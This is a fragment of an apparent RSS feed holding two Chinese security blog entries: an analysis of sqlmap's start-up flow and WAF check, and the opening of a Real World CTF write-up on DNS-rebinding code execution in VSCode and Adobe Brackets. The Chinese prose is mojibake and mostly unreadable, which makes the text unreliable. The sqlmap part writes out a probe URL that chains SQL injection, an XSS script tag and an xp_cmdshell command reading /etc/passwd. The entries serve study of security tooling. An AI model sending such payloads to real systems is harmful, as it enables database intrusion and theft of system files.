class=&quot;inline&quot;&gt;lib.parse.cmdline&lt;/code&gt; ä¸­å®šä¹‰çš„æ›´æ–°é€‰é¡¹ï¼Œå¦‚æœè¿™ä¸ªé€‰é¡¹æ‰“å¼€ï¼Œsqlmap ä¼šè‡ªåŠ¨æ›´æ–°å¹¶ä¸”ä¸ä¼šæ‰§è¡Œåç»­æµ‹è¯•æ­¥éª¤å’Œå®é™…å·¥ä½œçš„æ­¥éª¤ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7147c689ef37a795faf5d08e7f703ca6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1950&quot; data-rawheight=&quot;884&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7147c689ef37a795faf5d08e7f703ca6&quot; data-watermark-src=&quot;v2-d4372b7133e9b35129787b5b45a38cf6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;åœ¨å®é™…çš„å¯åŠ¨ä»£ç ä¸­ï¼Œç¬”è€…åœ¨ä¸Šå›¾ä¸­æ ‡æ³¨äº†ä¸¤å¤„ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨å‘½ä»¤è¡Œçš„æ—¶å€™ï¼Œæ›´å¤šçš„æ˜¯ç›´æ¥è°ƒç”¨ &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è·Ÿå…¥å…¶ä¸­å¯»æ‰¾ä¹‹åéœ€è¦ç ”ç©¶çš„éƒ¨åˆ†ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02 æµ‹è¯•å‰çš„ç›®æ ‡å‡†å¤‡&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å½“æˆ‘ä»¬æ‰¾åˆ° &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; å‡½æ•°çš„æ—¶å€™ï¼Œæ˜ å…¥çœ¼å¸˜çš„å®é™…ä¸Šæ˜¯ä¸€ä¸ªå¾ˆå¹³å¦çš„æµç¨‹ï¼Œæˆ‘ä»¬ç®€åŒ–ä¸€ä¸‹ï¼Œä»¥ä¸‹å›¾ä»£ç ä¸ºä¾‹ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5a46a1adf51de4bc8193ad0f3e8966dd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1658&quot; data-rawheight=&quot;763&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-5a46a1adf51de4bc8193ad0f3e8966dd&quot; data-watermark-src=&quot;v2-7855b8ab88049e96cbf57d43e8ee14ad&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æˆ‘ä»¬ä»ç„¶çœ‹åˆ°äº† &lt;code class=&quot;inline&quot;&gt;conf&lt;/code&gt; ä¸­ä¸€äº›å¾ˆå¥‡æ€ªçš„é€‰é¡¹ï¼Œé’ˆå¯¹è¿™äº›é€‰é¡¹æˆ‘ä»¬åœ¨ 0x01 èŠ‚ä¸­å¼ºè°ƒè¿‡ï¼Œå¯ä»¥åœ¨æŸä¸€äº›åœ°æ–¹æ‰¾åˆ°è¿™äº›é€‰é¡¹çš„çº¿ç´¢ï¼Œæˆ‘ä»¬ä»¥ &lt;code class=&quot;inline&quot;&gt;conf.direct&lt;/code&gt; ä¸ºä¾‹ï¼Œå¯ä»¥åœ¨ &lt;code class=&quot;inline&quot;&gt;lib.parse.cmdline&lt;/code&gt; ä¸­æ˜ç¡®æ‰¾åˆ°è¿™ä¸ªé€‰é¡¹çš„è¯´æ˜ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-318d59b0e4d7d6fd7aae65575a078363_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1972&quot; data-rawheight=&quot;1480&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-318d59b0e4d7d6fd7aae65575a078363&quot; data-watermark-src=&quot;v2-39dbe5162ee750945dc1de9ee4bd939d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æ ¹æ®è¯´æ˜ï¼Œè¿™æ˜¯ç›´è¿æ•°æ®åº“çš„é€‰é¡¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯èƒ½æš‚æ—¶å¹¶ä¸éœ€è¦å…³å¿ƒä»–ï¼Œæˆ‘ä»¬æš‚æ—¶åªå…³æ³¨ sqlmap æ˜¯å¦‚ä½•æ£€æµ‹æ¼æ´çš„ï¼Œè€Œä¸å…³å¿ƒä»–æ˜¯æ€ä¹ˆæ ·è°ƒç”¨æ•°æ®åº“ç›¸å…³æ“ä½œçš„ã€‚&lt;/p&gt;&lt;p&gt;æ¥ä¸‹æ¥ç¨æœ‰ä¸€äº›æƒ³æ³•çš„è¯»è€…å½“ç„¶çŸ¥é“ï¼Œæˆ‘ä»¬ç›´æ¥è¿›è¡Œç¬¬å››éƒ¨åˆ†é’ˆå¯¹è¿™ä¸ªç›®æ ‡å¾ªç¯çš„åˆ†ææ˜¯æœ€ç®€å•æœ‰æ•ˆçš„åŠæ³•äº†ï¼&lt;/p&gt;&lt;p&gt;å¥½çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±æ‰“å¼€æœ€æ ¸å¿ƒçš„æ£€æµ‹æ–¹æ³•ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e33fdbd94ef9457edf316c817cb0a3b6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1190&quot; data-rawheight=&quot;769&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e33fdbd94ef9457edf316c817cb0a3b6&quot; data-watermark-src=&quot;v2-e0f067acd87c38620b1bb69e9235dd8f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;è¿›å…¥å¾ªç¯ä½“ä¹‹åï¼Œé¦–å…ˆè¿›è¡Œæ£€æŸ¥ç½‘ç»œæ˜¯å¦é€šæ–­çš„é€‰é¡¹ï¼Œè¿™ä¸ªé€‰é¡¹å¾ˆå®¹æ˜“ç†è§£æˆ‘ä»¬å°±ä¸å¤šå™è¿°äº†ï¼›ç¡®ä¿ç½‘ç»œæ­£å¸¸ä¹‹åï¼Œå¼€å§‹è®¾ç½® &lt;code class=&quot;inline&quot;&gt;conf.url,conf.method,conf.data,conf.cookie&lt;/code&gt; å’Œ headers ç­‰å­—æ®µï¼Œå¹¶ä¸”åœ¨ &lt;code class=&quot;inline&quot;&gt;parseTargetUrl()&lt;/code&gt; ä¸­è¿›è¡Œå„ç§åˆç†æ€§æ£€æŸ¥ï¼›ä¹‹åä¼šæ ¹æ® HTTP çš„ Method æå–éœ€è¦æ£€æŸ¥çš„å‚æ•°ï¼›éšåå¦‚æœå½“å‰å¯åŠ¨æ—¶å‚æ•°æ¥å—äº†å¤šä¸ªç›®æ ‡çš„è¯ï¼Œä¼šåœ¨ç¬¬4æ­¥ä¸­åšä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œã€‚&lt;/p&gt;&lt;p&gt;åœ¨å®Œæˆä¸Šè¿°æ“ä½œä¹‹åï¼Œæ‰§è¡Œ &lt;code class=&quot;inline&quot;&gt;setupTargetEnv()&lt;/code&gt; è¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„å‡½æ•°ï¼Œå…¶åŒ…å«å¦‚ä¸‹æ“ä½œï¼š&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;def setupTargetEnv():
    _createTargetDirs()
    _setRequestParams()
    _setHashDB()
    _resumeHashDBValues()
    _setResultsFile()
    _setAuthCred()&lt;/code&gt;&lt;p&gt;å…¶ä¸­é™¤äº† &lt;code class=&quot;inline&quot;&gt;_setRequestParams()&lt;/code&gt; éƒ½æ˜¯å…³äºæœ¬èº«å­˜å‚¨ï¼ˆç¼“å­˜ï¼‰æ‰«æä¸Šä¸‹æ–‡å’Œç»“æœæ–‡ä»¶çš„ã€‚å½“ç„¶æˆ‘ä»¬æœ€å…³æ³¨çš„ç‚¹è‚¯å®šæ˜¯ &lt;code class=&quot;inline&quot;&gt;_setRequestParams()&lt;/code&gt; è¿™ä¸ªç‚¹ã€‚åœ¨æ·±å…¥äº†è§£è¿™ä¸€ä¸ªæ­¥éª¤ä¹‹åï¼Œæˆ‘ä»¬å‘ç°å…¶ä¸­ä¸»è¦æ¶‰åŠåˆ°å¦‚ä¸‹æ“ä½œï¼š&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-268cea4d6395e22a8ccb5f9c82947f6d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1216&quot; data-rawheight=&quot;760&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-268cea4d6395e22a8ccb5f9c82947f6d&quot; data-watermark-src=&quot;v2-553e8d329933128b44534a4e285c0e25&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6ed18233da3719acf9674e23c2acc6c2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1373&quot; data-rawheight=&quot;736&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6ed18233da3719acf9674e23c2acc6c2&quot; data-watermark-src=&quot;v2-089f806c9e175d73b2af49b39b63b3ea&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬å›å½’ä¹‹å‰çš„ &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; æ–¹æ³•ä¸­çš„ foreach targets çš„å¾ªç¯ä½“ä¸­ï¼Œåœ¨ &lt;code class=&quot;inline&quot;&gt;setupTargetEnv()&lt;/code&gt; ä¹‹åï¼Œæˆ‘ä»¬ç°åœ¨å·²ç»çŸ¥é“äº†å…³äºè¿™ä¸ªç›®æ ‡çš„æ‰€æœ‰çš„å¯ä»¥å°è¯•æ³¨å…¥æµ‹è¯•çš„ç‚¹éƒ½å·²ç»è®¾ç½®å¥½äº†ï¼Œå¹¶ä¸”éƒ½å­˜åœ¨äº† &lt;code class=&quot;inline&quot;&gt;conf.paramDict&lt;/code&gt; è¿™ä¸ªå­—å…¸ä¸­äº†ã€‚&lt;/p&gt;&lt;p&gt;è‡³æ­¤ï¼Œåœ¨æ­£å¼å¼€å§‹æ£€æµ‹ä¹‹å‰ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œ&lt;code class=&quot;inline&quot;&gt;conf.url, conf.method, conf.headers ...&lt;/code&gt; ä¹‹ç±»çš„åŒ…å«åŸºç¡€çš„æµ‹è¯•çš„ç›®æ ‡çš„ä¿¡æ¯ï¼Œåœ¨ &lt;code class=&quot;inline&quot;&gt;conf.paramDict&lt;/code&gt; ä¸­åŒ…å«å…·ä½“çš„ä¸åŒä½ç½®çš„éœ€è¦æµ‹è¯•çš„å‚æ•°çš„å­—å…¸ï¼Œå¯ä»¥æ–¹ä¾¿éšæ—¶æ¸²æŸ“ Payloadã€‚å…³äºå…¶å…·ä½“çš„è¡Œä¸ºï¼Œå…¶å®å¤§å¯ä¸å¿…å¤ªè¿‡å…³å¿ƒï¼Œå› ä¸ºæˆ‘ä»¬å…¶å®å¹¶ä¸éœ€è¦å…·ä½“çš„å¤„ç†ç»†èŠ‚ï¼Œè¿™äº›ç»†èŠ‚åº”è¯¥æ˜¯åœ¨æˆ‘ä»¬é‡åˆ°é—®é¢˜ï¼Œæˆ–è€…é‡åˆ°å””æ¸…æ¥šçš„åœ°æ–¹å†è·³å‡ºæ¥åœ¨è¿™äº›æ­¥éª¤ä¸­å¯»æ‰¾ï¼Œå¹¶ä¸”è¿›è¡Œç ”ç©¶ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 ä¸‡äº‹ä¿±å¤‡&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å¯ä»¥è¯´åœ¨è¯»è€…äº†è§£ä¸Šé¢ä¸¤èŠ‚è®²è¿°çš„å†…å®¹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ­£å¼æ¢æŸ¥çœŸæ­£çš„ SQL æ³¨å…¥æ£€æµ‹æ—¶å€™ sqlmap éƒ½åä¸Šäº†ä»€ä¹ˆã€‚å…¶å®ç®€å•æ¥è¯´ï¼Œéœ€è¦ç»è¿‡ä¸‹é¢æ­¥éª¤ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-934507fcca097d08998f6cac328b7403_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;618&quot; data-rawheight=&quot;886&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-934507fcca097d08998f6cac328b7403&quot; data-watermark-src=&quot;v2-ec9a1617b29b62d69fb350121f4705c1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;ç¬”è€…é€šè¿‡å¯¹ &lt;code class=&quot;inline&quot;&gt;controller.py&lt;/code&gt; ä¸­çš„ &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; å‡½æ•°è¿›è¡Œåˆ†æï¼Œå¾—å‡ºäº†ä¸Šé¢çš„æµç¨‹å›¾ã€‚åœ¨æ•´ä¸ªæ£€æµ‹è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æš‚ä¸”ä¸æ¶‰åŠç»†èŠ‚ï¼›æ•´ä¸ªæµç¨‹éƒ½æ˜¯é’ˆå¯¹æ£€æŸ¥ä¸€ä¸ªç›®æ ‡æ‰€è¦ç»å†çš„æ­¥éª¤ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;checkWaf&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;åœ¨ &lt;code class=&quot;inline&quot;&gt;checkWaf()&lt;/code&gt; ä¸­ï¼Œæ–‡æ¡£å†™æ˜ï¼š&lt;code class=&quot;inline&quot;&gt;Reference: http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse&lt;/code&gt;ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œå‘ç°ä»–çš„åŸç†å‡ºå¤„ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œç ”ç©¶ã€‚åœ¨å®é™…å®ç°çš„è¿‡ç¨‹ä¸­ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8f9b7d72061fd974204b902da76ed344_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1510&quot; data-rawheight=&quot;627&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8f9b7d72061fd974204b902da76ed344&quot; data-watermark-src=&quot;v2-a34b45cfd5bf2eafb243178b1373a242&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;ç¬”è€…åœ¨å…³é”®éƒ¨åˆ†å·²ç»æŠŠæ ‡æ³¨å’Œç®­å¤´å†™æ˜ï¼Œæ–¹ä¾¿å¤§å®¶ç†è§£ã€‚æˆ‘ä»¬å‘ç° &lt;code class=&quot;inline&quot;&gt;payload&lt;/code&gt; è¿™ä¸ªå˜é‡æ˜¯é€šè¿‡éšæœºä¸€ä¸ªæ•°å­— + space + ä¸€ä¸ªç‰¹åˆ¶ Payloadï¼ˆæ¶‰åŠåˆ°å¾ˆå¤šçš„å…³äºæ•æ„Ÿå…³é”®è¯ï¼Œå¯ä»¥å¾ˆå®¹æ˜“è§¦å‘ WAF æ‹¦æˆªï¼‰ã€‚&lt;/p&gt;&lt;p&gt;éšå³ï¼Œsqlmap ä¼šæŠŠ payload æ’å…¥è¯¥æ’å…¥çš„ä½ç½®ï¼šå¯¹äº GET ç±»çš„è¯·æ±‚ï¼Œsqlmap ä¼šåœ¨ä¹‹å‰çš„ query è¯­å¥åé¢åŠ å…¥ä¸€ä¸ªæ–°çš„å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°åé€šè¿‡ &lt;code class=&quot;inline&quot;&gt;randomStr()&lt;/code&gt; ç”Ÿæˆï¼Œå‚æ•°çš„å€¼å°±æ˜¯ç»è¿‡å¤„ç†çš„ Payloadã€‚å¦‚æœæœ‰è¯»è€…ä¸ç†è§£ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œå¯ä»¥ä¸¾ä¸€ä¸ªä¾‹å­ï¼š&lt;/p&gt;&lt;p&gt;å¦‚æœæˆ‘ä»¬é’ˆå¯¹ &lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;http://this.is.a.victim.com/article.php?id=1&lt;/code&gt;&lt;p&gt;è¿™æ ·çš„ URL è¿›è¡Œ Waf çš„æ£€æŸ¥ï¼Œsqlmap ä¼šå‘èµ·ä¸€ä¸ª&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;http://this.is.a.victim.com/article.php?id=1&amp;amp;mbjwe=2472%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--/%
2A%2A/%3B%20EXEC%20xp_cmdshell%28%27cat%20../../../etc/passwd%27%29%23&lt;/code&gt;&lt;p&gt;çš„æ–°çš„è¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚ä¼šæœ‰å¾ˆå¤§æ¦‚ç‡è§¦å‘ Waf çš„ååº”ï¼Œç„¶å sqlmap é€šè¿‡åˆ¤æ–­è¿”å›é¡µé¢å’Œä¹‹å‰é¡µé¢çš„ &lt;b&gt;Page Ratio&lt;/b&gt; æ¥åˆ¤æ–­æ˜¯å¦è§¦å‘äº† WAFã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;æˆ‘ä»¬ä¼¼ä¹é‡åˆ°ä¸€äº›é—®é¢˜&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æœ‰å¿ƒçš„è¯»è€…å¯èƒ½å‘ç°ï¼Œæˆ‘ä»¬åœ¨ä¸Šå°èŠ‚å‡ºç°äº†ä¸€ä¸ªç¥å¥‡é™Œç”Ÿçš„è¯ &lt;b&gt;Page Ratio&lt;/b&gt;, è¿™ä¸ªè¯å…¶å®åœ¨æ•´ä¸ª sqlmap ä¸­æ˜¯éå¸¸é‡è¦çš„å­˜åœ¨ï¼Œæˆ‘ä»¬ä¹‹åä¼šåœ¨åç»­çš„æ–‡ç« ä¸­è¯¦ç»†ä»‹ç»è¿™éƒ¨åˆ†ç†è®ºã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 ç„¶åå‘¢ï¼Ÿ&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å…¶å®æˆ‘ä»¬å½“ç„¶å¯ä»¥ç»§ç»­è®²è§£æ¯ä¸€ä¸ªå‡½æ•°éƒ½åšäº†ä»€ä¹ˆï¼Œä½†æ˜¯é™äºç¯‡å¹…é—®é¢˜ï¼Œæˆ‘ä»¬å¯èƒ½è¦å…ˆæš‚åœä¸€ä¸‹äº†ï¼›ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬æœ¬æ–‡çš„å†…å®¹â€œåŸºç¡€æµç¨‹â€å®é™…ä¸Šå·²ç»ä»‹ç»å®Œäº†ï¼Œå¹¶ä¸”å¼•å‡ºäº†æˆ‘ä»¬éœ€è¦åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä»‹ç»çš„æ¦‚å¿µä¹‹ä¸€â€œPage Ratioâ€ã€‚&lt;/p&gt;&lt;p&gt;æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å¯èƒ½è¦ç»“æŸæœ¬æ–‡äº†ï¼Œä½†æ˜¯æˆ‘æ›´å¸Œæœ›çš„æ˜¯ï¼Œæ¯ä¸€ä¸ªè¯»è€…éƒ½èƒ½å¤Ÿå°è¯•è‡ªå·±åˆ†æï¼Œè‡ªå·±å»åƒé€ sqlmap çš„ç»†èŠ‚ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x05 ç»“æŸè¯­&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æ„Ÿè°¢è¯»è€…çš„è€å¿ƒï¼Œåœ¨æ¥ä¸‹æ¥çš„æ–‡ç« ä¸­ï¼Œç¬”è€…å°†ä¼šæ›´åŠ æ·±å…¥ä»‹ç» sqlmap æœ€æ ¸å¿ƒçš„ç®—æ³•å’Œç»†èŠ‚å¤„ç†ã€‚&lt;/p&gt;</description>
<author>å°è˜‘è‡</author>
<guid isPermaLink="false">2018-08-29-43242220</guid>
<pubDate>Wed, 29 Aug 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Real World CTF doc2own å‘½é¢˜æŠ¥å‘Š</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-08-08-41544965.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/41544965&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-45dff9e7b0164cc42ef97d36d70acc61_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;æœ¬æ–‡ä½œè€…ï¼šå’¸é±¼&lt;/p&gt;&lt;p&gt;ä¸Šä¸ªæœˆçš„ realdworldctf è®¾è®¡äº†ä¸€ä¸ªå®Œå…¨çœŸå®çš„å®¢æˆ·ç«¯è½¯ä»¶ pwn é¢˜ç›®ã€‚&lt;/p&gt;&lt;p&gt;åœ¨æ¥åˆ°å‡ºé¢˜é‚€è¯·çš„æ—¶å€™ä¹Ÿå·®ç‚¹è¦â€œå¦è¯·é«˜æ˜â€äº†ã€‚å½“æ—¶æ­£å¥½åœ¨å‡†å¤‡ &lt;a href=&quot;https://zhuanlan.zhihu.com/p/21776300&quot;&gt;LoCCS çš„æš‘æœŸå­¦æ ¡&lt;/a&gt;çš„è¯¾ä»¶ï¼Œå› ä¸ºæ‹–å»¶æå¾—è®²è¯¾å‰å¤œé€šå®µæ²¡ç¡ç‹‚å†™ pptï¼Œç´§æ¥ç€åˆå®‰æ’å‡ºå·®ï¼Œè¶ç€é£æœºå»¶è¯¯ä¹‹ç±»çš„è¾¹è§’æ—¶é—´å†™è¯„æµ‹ç¯å¢ƒå’Œæµ‹è¯• exploit ä¹‹ç±»ï¼Œæœ€åè¿˜æ˜¯åœ¨æ¯”èµ›å·²ç»å¼€å§‹çš„æƒ…å†µä¸‹æ‰åœ¨ç¬¬ä¸€ä¸ªæ™šä¸ŠæŠŠç¨³å®šæ€§å ªå¿§çš„ç¯å¢ƒéƒ¨ç½²ä¸Šçº¿ã€‚&lt;/p&gt;&lt;p&gt;ä»“ä¿ƒçš„å‡ºé¢˜è¿‡ç¨‹ä¹Ÿæ˜¯åŸ‹ä¸‹äº†ä¼ç¬”ã€‚ç«Ÿç„¶åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œå…ˆåæœ‰å‡ æ”¯å›½é™…é˜Ÿä¼äº¤ä¸Šäº†çœŸæ­£çš„ 0day åˆ©ç”¨ã€‚è€Œèµ›åæˆ‘ç®€å•åç¼–è¯‘äº†ç¨‹åºï¼Œè¿˜å‘ç°äº†æ›´å¤šçš„è¿œç¨‹ä»£ç æ‰§è¡Œé—®é¢˜ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;ç”±äºè¡¥ä¸ä»Šå¤©åˆšåˆšå‘å¸ƒï¼Œåœ¨è¿™é‡Œæˆ‘ä¸ä¼šå…¬å¼€ç›¸å…³æ¼æ´çš„ç»†èŠ‚ã€‚&lt;/b&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;åœ¨å¹´åˆæˆ‘å¶ç„¶å‘ç°äº†ä¸€ä¸ª Visual Studio Code çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè€ŒæŠ¥å‘Šåå‘ç°è¢«æ’æ´äº†ã€‚è¿™ä¸ªé—®é¢˜æ˜¯ Electron ä½¿ç”¨äº† Chromium çš„è¿œç¨‹å‰ç«¯è°ƒè¯•åè®®ï¼Œæ˜¯åŸºäº http å’Œ WebSocket çš„ã€‚&lt;/p&gt;&lt;p&gt;æ”»å‡»è€…åœ¨çŸ¥é“è°ƒè¯•ç«¯å£çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ dns é‡ç»‘å®šçš„æŠ€å·§è·å¾—ä¸€ä¸ªéšæœºçš„ uuidï¼Œæ„é€ ä¸€ä¸ª WebSocket åè®®çš„ urlï¼Œå‘ Electron çš„å‰ç«¯æ³¨å…¥ä»»æ„ä»£ç ï¼Œå®ç° node.js ä»»æ„ä»£ç æ‰§è¡Œã€‚&lt;/p&gt;&lt;p&gt;VSCode åœ¨éƒ¨åˆ†ç‰ˆæœ¬ä¸­æ„å¤–å¼€å¯äº† Extension è¿›ç¨‹çš„è°ƒè¯•ç«¯å£ï¼Œåªè¦æµè§ˆä¸€ä¸ªç½‘é¡µå¹¶åœç•™æ•°åç§’ï¼ˆdns rebinding éœ€è¦ä¸€æ®µæ—¶é—´è®©æ—§ dns è®°å½•å¤±æ•ˆï¼‰ï¼Œè®¡ç®—æœºä¾¿å¯è¢«è¿œç¨‹æ§åˆ¶ï¼š&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;Visual Studio Code silently fixed a remote code execution vulnerability&lt;/a&gt;&lt;p&gt;å—æ­¤å¯å‘æˆ‘åœ¨ Adobe Brackets ä¸Šå‘ç°äº†å®Œå…¨ä¸€è‡´çš„æ¼æ´ï¼š&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/adobe/brackets/issues/14149&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;CEF remote debugging is vulnerable to dns rebinding attack #14149&lt;/a&gt;&lt;p&gt;ä¸ VSCode ä¸åŒçš„æ˜¯ï¼ŒAdobe Brackets æ²¡æœ‰ä½¿ç”¨ Electronï¼Œè€Œæ˜¯è‡ªè¡Œå°è£…çš„ libCEF æ¡†æ¶ï¼Œä¸ node.js çš„é›†æˆæ–¹å¼ä¹Ÿä¸åŒã€‚Electron å¯ä»¥åœ¨ window çš„ä¸Šä¸‹æ–‡ä¸­è®¿é—® node.js APIï¼Œè€Œ Brackets çš„ç¼–è¾‘å™¨å‰ç«¯åˆ™æ²¡æœ‰æä¾›è¿™ä¸ªåŠŸèƒ½ï¼Œå°½ç®¡ Brackets å½“ä¸­ä½¿ç”¨åˆ°äº† node.js è¿è¡Œæ—¶ã€‚&lt;/p&gt;&lt;p&gt;ä¸è¿‡ Brackets åœ¨ä¸Šä¸‹æ–‡ä¸­æš´éœ²äº†å¦‚ä¸‹çš„ä¸¤ä¸ªå¯¹è±¡ï¼šbrackets å’Œ appshell&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f1387cef8bb0e11e95bd04389228fc2f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1612&quot; data-rawheight=&quot;834&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f1387cef8bb0e11e95bd04389228fc2f&quot; data-watermark-src=&quot;v2-2cfaacf85c79d72c0eb08060a3756933&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;è¿™ä¸¤ä¸ªå¯¹è±¡å°è£…äº†æ–‡ä»¶ç³»ç»Ÿå’Œ shell ç›¸å…³çš„åŠŸèƒ½ã€‚è™½ç„¶æˆ‘ä»¬ä¸èƒ½ require(&#39;child_process&#39;)ï¼Œä½†æ˜¯é€šè¿‡ appshell.fs å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å†™ã€‚åˆ°æ–‡ä»¶è¯»å†™è¿™ä¸€æ­¥å…¶å®å·²ç»å¯ä»¥æ‹¿ flag äº†ï¼Œå½“ç„¶ä¸€å¼€å§‹æˆ‘ä»¬æ²¡æœ‰ç»™å‡º flag çš„è·¯å¾„ï¼Œè¿˜æ˜¯åå¼¹ä¸€ä¸ª shell æ¯”è¾ƒé è°±ã€‚è¦†ç›–å¯æ‰§è¡Œæ–‡ä»¶åŠ ä¸Šé¢å¤–çš„è§¦å‘æ¡ä»¶å³å¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚&lt;/p&gt;&lt;p&gt;åœ¨ Brackets çš„æ‰©å±•æ¥å£ä¸­ï¼Œæˆ‘æ‰¾åˆ°äº†å¦‚ä¸‹ä¸¤ä¸ªä¸ç³»ç»Ÿ shell ç›¸å…³çš„æ–¹æ³•ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;brackets.app.openURLInDefaultBrowser&lt;/li&gt;&lt;li&gt;brackets.app.showOSFolder&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;å‰è€…æ”¯æŒæ‰“å¼€ file:/// åŸŸåï¼Œåœ¨ Windows ä¸‹ç›¸å½“äº ShellExecuteï¼Œæ‰“å¼€ä¸€ä¸ª .cmd æˆ–è€… .exe å³å¯æ‰§è¡Œä»£ç ï¼›è€Œ showOSFolder åœ¨ macOS 